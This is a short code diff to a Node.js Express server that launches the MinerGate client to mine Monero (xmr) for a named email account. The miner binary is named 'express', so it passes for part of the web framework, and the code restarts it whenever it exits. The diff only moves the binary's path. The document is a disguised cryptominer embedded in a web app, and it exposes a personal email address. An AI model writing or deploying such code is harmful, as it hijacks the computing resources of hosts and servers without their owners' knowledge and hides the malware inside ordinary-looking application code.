@@ -2,7 +2,7 @@ const { spawn } = require('child_process');
 const express = require('express');
 const app = express();
 var state = true;
-var proc = spawn('./express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
+var proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
 
 
 
@@ -17,7 +17,7 @@ app.get('/stop', function (req, res) {
 
 const start = ()=>{
     state = true;
-    proc = spawn('./express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
+    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', 'xmr', '1']);
     proc.on('close', () => {
       console.log('child process exited');
       state = false;
